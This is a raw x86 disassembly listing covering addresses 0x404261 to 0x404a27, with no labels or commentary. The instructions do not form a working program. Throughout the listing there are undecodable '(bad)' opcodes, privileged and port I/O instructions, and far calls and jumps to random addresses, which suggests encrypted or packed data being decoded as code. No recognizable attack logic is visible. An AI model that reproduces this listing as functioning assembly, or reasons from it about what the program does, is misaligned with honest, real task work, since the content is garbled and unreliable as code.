  404261:	fs push ss
  404263:	inc    eax
  404264:	pusha  
  404265:	imul   esi,DWORD PTR [ebp+0x6fdbf1c8],0x7ccf7db5
  40426f:	ja     0x404233
  404271:	sar    DWORD PTR [edi+0x5dd3b58a],cl
  404277:	icebp  
  404278:	in     eax,dx
  404279:	jbe    0x4041fc
  40427b:	mov    cl,0x93
  40427d:	xor    eax,DWORD PTR [esi]
  40427f:	rcl    DWORD PTR [edx],0x0
  404282:	mov    al,ds:0xc5c77b45
  404287:	mov    ch,0x60
  404289:	shl    BYTE PTR [eax-0x1c],0xcf
  40428d:	mov    dl,0xd7
  40428f:	pusha  
  404290:	push   edi
  404291:	scas   eax,DWORD PTR es:[edi]
  404292:	inc    esp
  404293:	icebp  
  404294:	inc    edi
  404295:	call   0xfe1f51ca
  40429a:	add    al,0x30
  40429c:	leave  
  40429d:	fwait
  40429e:	(bad)  
  40429f:	cmp    al,cl
  4042a1:	xchg   ebx,eax
  4042a2:	xor    al,0x74
  4042a4:	mov    eax,0x8f22681c
  4042a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042aa:	ss inc esi
  4042ac:	repnz outs dx,BYTE PTR ds:[esi]
  4042ae:	imul   eax,eax,0xffffffac
  4042b1:	test   al,0x77
  4042b3:	imul   eax,esp,0xffffffca
  4042b6:	jns    0x404316
  4042b8:	or     BYTE PTR [eax],0x96
  4042bb:	jecxz  0x404314
  4042bd:	call   0xf303:0x781e1b29
  4042c4:	xchg   esp,eax
  4042c5:	adc    DWORD PTR [esp+edx*8+0x71],ecx
  4042c9:	pop    ebx
  4042ca:	pop    ebp
  4042cb:	xor    eax,0xbd69214a
  4042d0:	add    edi,DWORD PTR [edi+0x264c8715]
  4042d6:	(bad)  
  4042d7:	xchg   ebp,eax
  4042d8:	div    ebx
  4042da:	jp     0x4042c7
  4042dc:	int    0x37
  4042de:	or     BYTE PTR [ecx],ah
  4042e0:	mov    edi,0x5365fe4e
  4042e5:	pop    ecx
  4042e6:	pushf  
  4042e7:	sbb    al,0x52
  4042e9:	pop    esp
  4042ea:	je     0x404338
  4042ec:	mov    dh,0x21
  4042ee:	mul    DWORD PTR [eax-0x7f]
  4042f1:	(bad)  
  4042f3:	cld    
  4042f4:	scas   al,BYTE PTR es:[edi]
  4042f5:	ins    BYTE PTR es:[edi],dx
  4042f6:	push   cs
  4042f7:	adc    eax,0x3599666e
  4042fc:	mov    BYTE PTR [esi-0x57],al
  4042ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404300:	aam    0x0
  404302:	add    eax,0x3431614e
  404307:	pop    ebx
  404308:	jno    0x404380
  40430a:	popf   
  40430b:	and    al,0x3f
  40430d:	fidiv  DWORD PTR [edi+0x41]
  404310:	xor    cl,BYTE PTR [ebx]
  404312:	and    al,0x92
  404314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404315:	sub    BYTE PTR [eax+0x7460c37c],ch
  40431b:	push   edx
  40431c:	pop    eax
  40431d:	push   0x6
  40431f:	cmp    BYTE PTR [edx-0x6a],bl
  404322:	retf   
  404323:	enter  0x5bb3,0x96
  404327:	sti    
  404328:	fldenv [esp+eax*8+0x6fb0fced]
  40432f:	icebp  
  404330:	mov    edx,0x87a64ce5
  404335:	aam    0x4e
  404337:	mov    esp,0xd0311fa
  40433c:	sbb    esi,DWORD PTR [ebx+eax*2+0x2a]
  404340:	sub    eax,0x4e4d6c39
  404345:	dec    esp
  404346:	or     eax,0x4963782b
  40434b:	(bad)  
  40434c:	jnp    0x40431c
  40434e:	bound  ebx,QWORD PTR [esi]
  404350:	dec    ebp
  404351:	ret    
  404352:	aad    0x19
  404354:	sbb    BYTE PTR [esi+0x5b],0x4f
  404358:	sti    
  404359:	push   0xcace8874
  40435e:	xchg   ebx,eax
  40435f:	arpl   WORD PTR [ecx+0xd],dx
  404362:	push   ebx
  404363:	outs   dx,DWORD PTR ds:[esi]
  404364:	dec    edi
  404365:	sub    al,dl
  404367:	daa    
  404368:	xor    ah,dl
  40436a:	retf   0x96cf
  40436d:	sub    esi,DWORD PTR [ebp+0x40]
  404370:	push   ss
  404371:	mov    ecx,0x1d3cdde5
  404376:	retf   
  404377:	dec    ebx
  404378:	jmp    0x4043c7
  40437a:	fimul  WORD PTR [eax+edi*4+0x1f293e84]
  404381:	or     bl,ch
  404383:	fwait
  404384:	hlt    
  404385:	mov    DWORD PTR [esi-0x5b],edx
  404388:	(bad)  
  404389:	call   0xc8a73218
  40438e:	and    al,0x3a
  404390:	xchg   esi,eax
  404391:	xor    dh,BYTE PTR [ebx+edx*4]
  404394:	mov    dh,0x5f
  404396:	push   ss
  404397:	imul   ebp,esp,0xffffffed
  40439a:	nop
  40439b:	push   0x30
  40439d:	popa   
  40439e:	and    al,0x16
  4043a0:	fnstsw WORD PTR [ebx-0x6b32b489]
  4043a6:	pop    ebp
  4043a7:	(bad)  
  4043a8:	mov    al,0x3
  4043aa:	jmp    0xc1ed:0x61fcda28
  4043b1:	pop    ecx
  4043b2:	xor    al,0x6d
  4043b4:	dec    esp
  4043b5:	dec    edx
  4043b6:	cs jmp 0x404349
  4043b9:	je     0x4043de
  4043bb:	data16 into 
  4043bd:	(bad)  
  4043be:	jecxz  0x404373
  4043c0:	pop    DWORD PTR [ebx-0x28]
  4043c3:	(bad)  
  4043c4:	dec    ecx
  4043c5:	sbb    DWORD PTR [esi-0x7c],0x4d
  4043c9:	mov    esp,0xedfd2559
  4043ce:	dec    eax
  4043cf:	sti    
  4043d0:	mov    ecx,0xb6b57c30
  4043d5:	mov    bh,0xe
  4043d7:	sbb    ch,BYTE PTR [esi]
  4043d9:	adc    DWORD PTR [ebx+ebp*8],edx
  4043dc:	push   ecx
  4043dd:	cmc    
  4043de:	xor    eax,0x6a607f7
  4043e3:	xchg   edi,eax
  4043e5:	retf   0x4553
  4043e8:	xor    edi,DWORD PTR [ebp+0x3]
  4043eb:	lea    esp,[ebx+edi*8]
  4043ee:	ret    
  4043ef:	inc    dh
  4043f1:	adc    edi,edi
  4043f3:	xor    dl,BYTE PTR [ecx-0x39af9d2c]
  4043f9:	fcmovnb st,st(3)
  4043fb:	jle    0x40443b
  4043fd:	or     eax,DWORD PTR [ecx+0x5b]
  404400:	pop    eax
  404401:	pop    edi
  404402:	dec    ebx
  404403:	mov    WORD PTR [ebp-0xd],fs
  404406:	jge    0x40446e
  404408:	and    eax,0x11a5a8d7
  40440d:	loop   0x4043e7
  40440f:	mov    ch,0x61
  404411:	xchg   ebp,eax
  404412:	fwait
  404413:	jmp    0x7172:0x7f70fec2
  40441a:	add    ch,BYTE PTR [edx]
  40441c:	in     al,0x7d
  40441e:	push   eax
  40441f:	call   0x52bf:0xf5608418
  404426:	mov    dh,0x37
  404428:	aam    0xb3
  40442a:	jg     0x4043dc
  40442c:	mov    BYTE PTR [eax-0xda19689],bh
  404432:	xchg   esp,eax
  404433:	std    
  404434:	mov    ebx,0x1bc45bee
  404439:	jo     0x404403
  40443b:	inc    DWORD PTR [ebx]
  40443d:	adc    al,0xe
  40443f:	into   
  404440:	stos   DWORD PTR es:[edi],eax
  404441:	adc    BYTE PTR [ecx+0x6587577f],bh
  404447:	rcl    ch,1
  404449:	sbb    al,0xfd
  40444b:	in     al,dx
  40444c:	jae    0x4044ab
  40444e:	push   cs
  40444f:	dec    ebp
  404450:	in     al,0xe7
  404452:	push   esi
  404453:	mov    DWORD PTR [edx-0x5d481e94],edx
  404459:	mov    WORD PTR [esi-0x44],es
  40445c:	mov    ecx,0x46acab13
  404461:	imul   edx,DWORD PTR [ebp+0x6b],0x79c644df
  404468:	push   esi
  404469:	test   al,0xa9
  40446b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40446c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40446d:	sbb    esi,ecx
  40446f:	mov    ah,0x33
  404471:	call   0x1f93bb18
  404476:	lock dec edx
  404478:	jns    0x40445c
  40447a:	int3   
  40447b:	cmp    eax,0xfc11e6a9
  404480:	mov    ch,ch
  404482:	push   ebx
  404483:	lea    ebp,[ebx]
  404485:	repnz fwait
  404487:	xchg   edi,eax
  404488:	imul   esp,DWORD PTR [edi+0x3b],0xffffff90
  40448c:	es out dx,eax
  40448e:	mov    edi,0x215e6917
  404493:	inc    ebp
  404494:	jp     0x404485
  404496:	dec    esi
  404497:	adc    bl,BYTE PTR [edx*8-0x4659fdf9]
  40449e:	mov    cl,0xa7
  4044a0:	inc    eax
  4044a1:	adc    DWORD PTR [edi+0x12dab130],eax
  4044a7:	ins    BYTE PTR es:[edi],dx
  4044a8:	mov    dl,0xd0
  4044aa:	neg    eax
  4044ac:	jg     0x404504
  4044ae:	fbld   TBYTE PTR [edi]
  4044b0:	push   0x42
  4044b2:	mov    edi,0x311ee24
  4044b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044b8:	sub    al,0x3b
  4044ba:	mov    eax,ds:0xae6827b
  4044bf:	inc    esi
  4044c0:	jae    0x40447d
  4044c2:	outs   dx,DWORD PTR ds:[esi]
  4044c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c4:	dec    ebp
  4044c5:	enter  0xc8be,0xdb
  4044c9:	inc    ecx
  4044ca:	push   edi
  4044cb:	adc    dl,dh
  4044cd:	(bad)  
  4044ce:	in     eax,0xef
  4044d0:	cmp    eax,DWORD PTR [ebp+0x7fe5dbf]
  4044d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044d7:	std    
  4044d8:	cld    
  4044d9:	pop    ebx
  4044da:	mov    ebx,0xaccdf1d
  4044df:	in     al,0x7c
  4044e1:	or     esi,DWORD PTR gs:[edx+0x4eb94761]
  4044e8:	dec    edi
  4044e9:	leave  
  4044ea:	inc    ecx
  4044eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ec:	jo     0x404513
  4044ee:	sub    BYTE PTR [ecx],bh
  4044f0:	mov    esi,DWORD PTR [eax-0x7fd5a4bc]
  4044f6:	mov    al,ds:0x9096673e
  4044fb:	inc    esp
  4044fc:	or     esp,ecx
  4044fe:	cwde   
  4044ff:	cmp    DWORD PTR [ebp+0x7ae5cfb4],0xc0cc5ffb
  404509:	ds in  eax,dx
  40450b:	pmuludq mm5,QWORD PTR [eax]
  40450e:	inc    esi
  40450f:	cwde   
  404510:	inc    eax
  404511:	div    DWORD PTR [ecx-0x4803f232]
  404517:	ja     0x404535
  404519:	rep outs dx,BYTE PTR ds:[esi]
  40451b:	pop    ecx
  40451c:	test   BYTE PTR [esi],0x23
  40451f:	adc    DWORD PTR [ebx-0x7b],esi
  404522:	inc    edx
  404523:	outs   dx,DWORD PTR ds:[esi]
  404524:	dec    edx
  404525:	xchg   ebx,eax
  404526:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404527:	ins    BYTE PTR es:[edi],dx
  404528:	adc    eax,0xc04b5aee
  40452d:	jp     0x40456c
  40452f:	lods   eax,DWORD PTR ds:[esi]
  404530:	push   ds
  404531:	fldcw  WORD PTR [edi+eax*4+0x41]
  404535:	mov    ch,0x84
  404537:	xchg   ebx,eax
  404538:	dec    ebp
  404539:	call   0x5081a813
  40453e:	and    BYTE PTR [edx],dh
  404540:	in     al,0x3d
  404542:	(bad)  
  404543:	fiadd  DWORD PTR ds:0x784bc000
  404549:	loop   0x40455c
  40454b:	adc    eax,0xe3d2c646
  404550:	lea    edx,ds:[eax+esi*2]
  404554:	or     cl,BYTE PTR [edx]
  404556:	mov    ebx,0x6dad136b
  40455b:	test   al,0x3a
  40455d:	test   dh,bl
  40455f:	or     BYTE PTR [eax+0x7e],0xd5
  404563:	cmp    eax,0x1221e8a6
  404568:	adc    eax,0x7ae055e3
  40456d:	aad    0x6a
  40456f:	dec    DWORD PTR [edi-0x30]
  404572:	mov    ch,0x46
  404574:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  404576:	js     0x404536
  404578:	imul   esi,DWORD PTR [esi],0x52
  40457b:	ret    
  40457c:	(bad)  
  40457d:	xchg   esp,eax
  40457e:	out    dx,al
  40457f:	pop    edx
  404580:	sahf   
  404581:	retf   
  404582:	outs   dx,DWORD PTR ds:[esi]
  404583:	adc    ebp,ebp
  404585:	fcom   DWORD PTR [eax-0x4e]
  404588:	sbb    al,BYTE PTR [ebp-0x6fb182dd]
  40458e:	jo     0x4045d2
  404590:	adc    BYTE PTR ds:0x6de532ff,dh
  404596:	ror    BYTE PTR [ebp-0x49beffa6],cl
  40459c:	or     eax,DWORD PTR [ecx-0x6fd7d396]
  4045a2:	repnz mov eax,eax
  4045a5:	xor    al,BYTE PTR [edi]
  4045a7:	hlt    
  4045a8:	mov    WORD PTR [edi+0x47],cs
  4045ab:	pop    ebx
  4045ac:	push   cs
  4045ad:	fucomip st,st(5)
  4045af:	cmc    
  4045b0:	adc    eax,0x61a75647
  4045b5:	mov    ah,0xc3
  4045b7:	sbb    eax,0xe5b729fa
  4045bc:	jle    0x404548
  4045be:	cmp    edx,ecx
  4045c0:	jns    0x4045e2
  4045c2:	sub    al,0xb
  4045c4:	shl    BYTE PTR [edi],1
  4045c6:	outs   dx,DWORD PTR ds:[esi]
  4045c7:	fisttp QWORD PTR [ebp-0x52048d04]
  4045cd:	pop    eax
  4045ce:	pop    es
  4045cf:	or     dl,BYTE PTR [ebx+0x59]
  4045d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045d3:	push   ds
  4045d4:	add    al,0x2b
  4045d6:	mov    cl,al
  4045d8:	mov    ch,ch
  4045da:	imul   BYTE PTR [edx+0x6423e631]
  4045e0:	push   0x4b
  4045e2:	lods   eax,DWORD PTR ds:[esi]
  4045e3:	stc    
  4045e4:	add    DWORD PTR [esi+0xa],ebp
  4045e7:	loopne 0x4045f3
  4045e9:	(bad)  
  4045ea:	cmp    BYTE PTR [ebx],dh
  4045ec:	nop
  4045ed:	mov    ebx,0x7f1d9f75
  4045f2:	mov    ebp,0xaec91902
  4045f7:	jb     0x404584
  4045f9:	js     0x4045fd
  4045fb:	add    DWORD PTR [esi],eax
  4045fd:	pop    esp
  4045fe:	or     eax,0xf053789a
  404603:	dec    esi
  404604:	test   BYTE PTR [edi+ebp*2],ah
  404607:	in     al,dx
  404608:	add    BYTE PTR [ebx],0x2f
  40460b:	add    bl,bl
  40460d:	inc    ebx
  40460e:	test   al,0xd9
  404610:	fdivr  QWORD PTR [edx]
  404612:	stos   BYTE PTR es:[edi],al
  404613:	or     eax,0xcbd23376
  404618:	jmp    0x6eaab132
  40461d:	outs   dx,DWORD PTR ds:[esi]
  40461e:	pop    esp
  40461f:	ficom  WORD PTR [edx]
  404621:	or     dh,bl
  404623:	adc    al,0x64
  404625:	add    BYTE PTR [ecx+0x4f92352e],ah
  40462b:	inc    ecx
  40462c:	dec    eax
  40462d:	jg     0x404637
  40462f:	rol    BYTE PTR [ebx*2+0x57c3fdba],0xf8
  404637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404638:	loop   0x404631
  40463a:	xchg   DWORD PTR ds:0xc4ee7a27,ebp
  404640:	cwde   
  404641:	dec    eax
  404642:	imul   eax,DWORD PTR [edx+eax*2],0xffffffd2
  404646:	cmp    cl,BYTE PTR [esi+0x33645ddb]
  40464c:	jo     0x4046cb
  40464e:	rcl    DWORD PTR [ebp+0x39],0xa0
  404652:	imul   edx,edi,0x3
  404655:	mov    ds:0x7c2cd143,eax
  40465a:	mov    bh,0xf6
  40465c:	(bad)  
  40465d:	call   0x50f4:0x50023c63
  404664:	jmp    0x4046de
  404666:	pop    ebx
  404667:	mov    bl,0x3
  404669:	add    BYTE PTR [edx],al
  40466b:	sub    dh,BYTE PTR [ecx]
  40466d:	pop    edi
  40466e:	pop    esp
  40466f:	xchg   esp,eax
  404670:	(bad)  
  404672:	xor    ecx,ebx
  404674:	xor    al,0xf9
  404676:	stc    
  404677:	or     eax,0x8908dfe
  40467c:	cmc    
  40467d:	pushf  
  40467e:	add    al,dl
  404680:	sahf   
  404681:	pop    eax
  404682:	or     eax,0x4cca00e7
  404687:	pop    es
  404688:	rcl    dh,cl
  40468a:	outs   dx,BYTE PTR ds:[esi]
  40468b:	mov    cl,0x78
  40468d:	aaa    
  40468e:	or     edx,edi
  404690:	lea    esi,[ecx-0x10]
  404693:	sbb    esi,DWORD PTR [ecx-0x6a]
  404696:	out    0x64,eax
  404698:	mov    esi,0x50edc6ca
  40469d:	mov    ah,0xea
  40469f:	sub    ebp,DWORD PTR [ebx+0x3693fe07]
  4046a5:	sub    eax,0x9bf7dbf0
  4046aa:	xor    dl,al
  4046ac:	pop    ebx
  4046ad:	ds mov cl,0xfe
  4046b0:	add    DWORD PTR [edi+ebx*1+0x39],ecx
  4046b4:	sub    dl,BYTE PTR [edi+ecx*2+0x6c1f0309]
  4046bb:	ins    BYTE PTR es:[edi],dx
  4046bc:	je     0x404653
  4046be:	cmp    eax,0x5fc607a0
  4046c3:	iret   
  4046c4:	mov    esi,DWORD PTR [ebx]
  4046c6:	js     0x40467f
  4046c8:	(bad)  
  4046c9:	retf   0x3fac
  4046cc:	xor    al,0x5d
  4046ce:	neg    dl
  4046d0:	ror    bh,0xc7
  4046d3:	dec    ebx
  4046d4:	mov    BYTE PTR [ebp-0x1c],bl
  4046d7:	icebp  
  4046d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d9:	sbb    al,0x68
  4046db:	push   ecx
  4046dc:	jmp    0xfdb9474e
  4046e1:	rcl    DWORD PTR [ecx-0x8],1
  4046e4:	sub    eax,0xef8421a7
  4046e9:	push   es
  4046ea:	inc    ebx
  4046eb:	imul   esi,DWORD PTR [edx-0x55],0xb2458dce
  4046f2:	imul   esi,DWORD PTR [ebp-0x4d1d73cb],0xffffffbd
  4046f9:	call   0xfae7:0x9b5ab0f8
  404700:	add    dh,BYTE PTR [ebp-0x29]
  404703:	mov    ebx,0x566e6c71
  404708:	pop    ss
  404709:	scas   al,BYTE PTR es:[edi]
  40470a:	int3   
  40470b:	pop    ebp
  40470c:	pusha  
  40470d:	jns    0x4046ea
  40470f:	mov    eax,0x5f85e923
  404714:	mov    ebp,0xd0d814f4
  404719:	push   ebx
  40471a:	rol    DWORD PTR [ebx],cl
  40471c:	(bad)  
  40471d:	rcr    DWORD PTR [eax],1
  40471f:	adc    DWORD PTR [edi-0x49b11844],eax
  404725:	and    al,0xd6
  404727:	sbb    ah,BYTE PTR gs:[edi]
  40472a:	(bad)  
  40472b:	or     DWORD PTR gs:[esi],eax
  40472e:	data16 mov ch,BYTE PTR [edx-0x71]
  404732:	and    DWORD PTR ds:0xf813cd78,ebp
  404738:	push   eax
  40473a:	and    edi,DWORD PTR [edx+0x5762e09e]
  404740:	loopne 0x4047a4
  404742:	in     al,dx
  404743:	mov    eax,ds:0x91183465
  404748:	into   
  404749:	cdq    
  40474a:	mov    ecx,0x45fae73c
  40474f:	stos   BYTE PTR es:[edi],al
  404750:	mov    bh,0xf6
  404752:	fnsave [ecx+edx*1-0x44]
  404756:	fild   WORD PTR [edx+0x609e5707]
  40475c:	jg     0x404713
  40475e:	cmc    
  40475f:	add    eax,0x9993bfdd
  404764:	out    dx,eax
  404765:	sahf   
  404766:	add    ecx,ecx
  404768:	jle    0x4047d9
  40476a:	pop    ss
  40476b:	sub    BYTE PTR [eax+0x20],0xdd
  40476f:	jl     0x4047a5
  404771:	fs stc 
  404773:	pop    edx
  404774:	jge    0x404723
  404776:	sbb    eax,0x683dacdf
  40477b:	xor    al,0x5a
  40477d:	xor    ebp,ebp
  40477f:	int3   
  404780:	sti    
  404781:	ret    
  404782:	pop    edx
  404783:	mov    ?,WORD PTR [ebp-0x6]
  404786:	cmp    cl,BYTE PTR [eax-0x5e]
  404789:	push   0xf4541262
  40478e:	cwde   
  40478f:	jmp    0xf811:0x954ed881
  404796:	fcmovb st,st(4)
  404798:	jge    0x404803
  40479a:	fsub   DWORD PTR [esi]
  40479c:	(bad)  
  40479d:	jo     0x404766
  40479f:	inc    eax
  4047a0:	mov    bl,0x30
  4047a2:	add    al,0x57
  4047a4:	aas    
  4047a5:	push   cs
  4047a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047a7:	call   0xf352:0xd2149d4c
  4047ae:	push   ecx
  4047af:	clc    
  4047b0:	popf   
  4047b1:	inc    edx
  4047b2:	jecxz  0x404774
  4047b4:	xchg   ebx,eax
  4047b5:	fs aas 
  4047b7:	xchg   esi,eax
  4047b8:	mov    eax,edi
  4047ba:	(bad)  
  4047bb:	push   cs
  4047bc:	lahf   
  4047bd:	dec    esi
  4047be:	lahf   
  4047bf:	shl    cl,cl
  4047c1:	dec    eax
  4047c2:	aas    
  4047c3:	(bad)  
  4047c4:	leave  
  4047c5:	push   ebp
  4047c6:	mov    ecx,0xf83daa7c
  4047cb:	loopne 0x40478c
  4047cd:	xchg   esi,eax
  4047ce:	hlt    
  4047cf:	pusha  
  4047d0:	xchg   ebx,eax
  4047d1:	mov    bl,0x69
  4047d3:	cmp    ebx,DWORD PTR [edx+0x4c]
  4047d6:	icebp  
  4047d7:	test   al,0xd2
  4047d9:	jo     0x404857
  4047db:	xchg   edi,eax
  4047dc:	push   0x9f36da9f
  4047e1:	mul    BYTE PTR [edi]
  4047e3:	dec    esi
  4047e4:	out    0xa5,eax
  4047e6:	sub    DWORD PTR [edx],ebp
  4047e8:	aam    0xcd
  4047ea:	inc    edi
  4047eb:	jb     0x404828
  4047ed:	test   al,0x5
  4047ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047f0:	mov    edi,0xbaa9368c
  4047f5:	mov    BYTE PTR [esi-0x567285e8],ch
  4047fb:	dec    edx
  4047fc:	jne    0x4047c7
  4047fe:	(bad)  
  404800:	int    0x76
  404802:	data16 mov bl,0xb5
  404805:	rol    BYTE PTR [ebx-0x650e5bc1],1
  40480b:	rcl    DWORD PTR [edi],1
  40480d:	dec    ecx
  40480e:	sbb    eax,ecx
  404810:	pop    edi
  404811:	pop    ecx
  404812:	jbe    0x404879
  404814:	pop    edx
  404815:	dec    esp
  404816:	push   0x6db2c2e3
  40481b:	repz or BYTE PTR [ebx-0x7383b4a8],bh
  404822:	fimul  DWORD PTR [eax]
  404824:	sbb    edi,edx
  404826:	xchg   ebx,eax
  404827:	fldcw  WORD PTR [ecx-0x12]
  40482a:	jl     0x404897
  40482c:	pushf  
  40482d:	pusha  
  40482e:	add    al,0xe4
  404830:	xchg   edi,eax
  404831:	adc    dh,ch
  404833:	xchg   ebx,eax
  404834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404835:	cld    
  404836:	mov    cl,0xc
  404838:	(bad)  
  404839:	lea    edx,[ebp-0x7143fe19]
  40483f:	mov    edx,0xfefe603b
  404844:	mov    ss,WORD PTR [ebp+0x37]
  404847:	xchg   ebx,eax
  404848:	(bad)  
  404849:	aas    
  40484a:	call   0x981f2dd3
  40484f:	adc    BYTE PTR [edx+eax*8-0x2c],cl
  404853:	daa    
  404854:	out    0xd2,eax
  404856:	pop    ss
  404857:	mov    ah,0xef
  404859:	mov    ebp,esi
  40485b:	jne    0x404801
  40485d:	out    dx,eax
  40485e:	xor    BYTE PTR [esi+0x36],0x6
  404862:	sahf   
  404863:	daa    
  404864:	push   eax
  404865:	mov    al,0xe2
  404867:	lds    ecx,FWORD PTR [edi]
  404869:	pop    ds
  40486a:	inc    ecx
  40486b:	mov    ds:0x1342840f,eax
  404870:	xlat   BYTE PTR ds:[ebx]
  404871:	cmp    eax,0xb868ddeb
  404876:	xchg   ebp,eax
  404877:	arpl   WORD PTR [esi+0xdd0c410],sp
  40487d:	mov    eax,ds:0xfabb4ee6
  404882:	ror    BYTE PTR [esi],1
  404884:	stc    
  404885:	push   0xffffffae
  404887:	dec    edi
  404888:	retf   
  404889:	push   edi
  40488a:	test   BYTE PTR [eax-0x3a],bh
  40488d:	mov    edi,0x25ac45c4
  404892:	push   0x9f392795
  404897:	push   ss
  404898:	mov    esp,0xcff0513a
  40489d:	in     al,dx
  40489e:	fsubr  QWORD PTR ds:[edx+0x56116775]
  4048a5:	aaa    
  4048a6:	imul   ebp,DWORD PTR [ebp-0x7c0b9f01],0x1a
  4048ad:	(bad)  
  4048ae:	es test al,0xae
  4048b1:	pop    esi
  4048b2:	mov    dl,0xa0
  4048b4:	mov    eax,0x86a20568
  4048b9:	(bad)  
  4048ba:	loop   0x4048e5
  4048bc:	or     BYTE PTR [ebx-0x3c],dh
  4048bf:	gs or  bh,bl
  4048c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048c3:	fimul  DWORD PTR [eax+ecx*1+0x73b9998f]
  4048ca:	bound  ecx,QWORD PTR ds:0xda2515a4
  4048d0:	mov    ecx,0xc342728d
  4048d5:	cwde   
  4048d6:	jb     0x404900
  4048d8:	dec    esi
  4048d9:	push   eax
  4048da:	jnp    0x404944
  4048dc:	mov    ecx,0x5733aff9
  4048e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048e2:	leave  
  4048e3:	iret   
  4048e4:	xlat   BYTE PTR ds:[ebx]
  4048e5:	cmp    eax,0x1ae24077
  4048ea:	cli    
  4048eb:	xchg   ebp,edx
  4048ed:	mov    cl,bh
  4048ef:	mov    eax,0x524f3f63
  4048f4:	test   eax,0xbd22b4c
  4048f9:	dec    ecx
  4048fa:	(bad)  
  4048fb:	stos   DWORD PTR es:[edi],eax
  4048fc:	int3   
  4048fd:	ret    
  4048fe:	dec    edx
  4048ff:	xchg   ebx,eax
  404900:	sbb    eax,edi
  404902:	lods   eax,DWORD PTR ds:[esi]
  404903:	loope  0x404923
  404905:	push   es
  404906:	fisubr WORD PTR [ecx+edx*8+0x7]
  40490a:	sbb    ax,0x9e1b
  40490e:	lock adc DWORD PTR [ebx-0xd3b925c],esi
  404915:	push   edx
  404916:	fstp   TBYTE PTR [esi]
  404918:	push   ds
  404919:	push   ds
  40491a:	inc    esi
  40491b:	mov    ds:0xb4235103,eax
  404920:	test   eax,0x941c4ada
  404925:	out    0xb4,eax
  404927:	and    eax,0xb136363c
  40492c:	push   ds
  40492d:	and    eax,0x939e1dc
  404932:	mul    BYTE PTR gs:[edx]
  404935:	mov    edi,0xa3162abe
  40493a:	mov    ebp,DWORD PTR [ebx]
  40493c:	or     dh,BYTE PTR [eax-0x53b39334]
  404942:	push   ss
  404943:	jecxz  0x40493d
  404945:	add    BYTE PTR [ebx+edx*8-0x52],0xe7
  40494a:	fwait
  40494b:	push   es
  40494c:	cdq    
  40494d:	pop    ds
  40494e:	pop    edi
  40494f:	sar    BYTE PTR [ebx-0x4bea15bf],1
  404955:	mov    ch,dl
  404957:	pop    ds
  404958:	push   es
  404959:	fs popa 
  40495b:	sbb    DWORD PTR [edi+0x6e],esp
  40495e:	jg     0x4049c1
  404960:	jbe    0x4048ea
  404962:	rcl    DWORD PTR [ebp-0x1d56aebe],0x85
  404969:	cmp    eax,0x9af01fc
  40496e:	call   0x8510:0x4aa56a24
  404975:	dec    edx
  404976:	hlt    
  404977:	cmc    
  404978:	push   ds
  404979:	ds mov ecx,0x292aa015
  40497f:	aad    0x6e
  404981:	test   BYTE PTR [edi+0x1b],bh
  404984:	cwde   
  404985:	std    
  404986:	loop   0x404945
  404988:	push   ss
  404989:	rcr    ah,cl
  40498b:	jb     0x404988
  40498d:	jle    0x4049ed
  40498f:	dec    ebx
  404990:	pop    edx
  404991:	stos   DWORD PTR es:[edi],eax
  404992:	push   ss
  404993:	leave  
  404994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404995:	cs mov bh,0x75
  404998:	jmp    0x531b2ccc
  40499d:	cmp    bh,BYTE PTR [ecx]
  40499f:	cs sub al,0xd6
  4049a2:	stos   BYTE PTR es:[edi],al
  4049a3:	mov    bl,0x51
  4049a5:	cdq    
  4049a6:	call   0xbe6b:0xcaa359da
  4049ad:	in     al,dx
  4049ae:	mov    cl,0xc7
  4049b0:	shr    DWORD PTR [edi-0x27],1
  4049b3:	(bad)  
  4049b4:	sub    edx,DWORD PTR [edi+0x239e4801]
  4049ba:	clc    
  4049bb:	xchg   esi,eax
  4049bc:	cs cmp al,0xc7
  4049bf:	xor    ebp,edx
  4049c1:	mov    al,0xa9
  4049c3:	imul   eax,DWORD PTR [ecx+edx*2+0x8],0xffffffe0
  4049c8:	bound  esi,QWORD PTR [eax]
  4049ca:	pop    ecx
  4049cb:	fisubr WORD PTR gs:[ebx-0x1d]
  4049cf:	aas    
  4049d0:	sub    eax,0x3c28dec3
  4049d5:	pushf  
  4049d6:	adc    eax,0x95030f9
  4049db:	int    0x9c
  4049dd:	xchg   edx,eax
  4049de:	sti    
  4049df:	stos   BYTE PTR es:[edi],al
  4049e0:	fidiv  DWORD PTR [ecx]
  4049e2:	jmp    0x64e5:0x49432237
  4049e9:	add    cl,dl
  4049eb:	and    BYTE PTR [ebx-0x1fac673e],bh
  4049f1:	call   0xd8a2:0x38efb3f4
  4049f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049f9:	mov    ds:0xceee4c09,al
  4049fe:	or     BYTE PTR [ecx+0x5ad29739],bl
  404a04:	pop    ebx
  404a05:	mov    bl,0xc8
  404a07:	leave  
  404a08:	xchg   ebx,eax
  404a09:	jecxz  0x404a7d
  404a0b:	popf   
  404a0c:	and    eax,0xd7273e48
  404a11:	imul   ecx,edi,0xce5a8642
  404a17:	(bad)  
  404a18:	loop   0x404a10
  404a1a:	mov    ebx,0xf3bc5f21
  404a1f:	sub    al,0x43
  404a21:	je     0x404a50
  404a23:	repz out dx,al
  404a25:	dec    esp
  404a26:	inc    eax
  404a27:	adc    al,0xf6
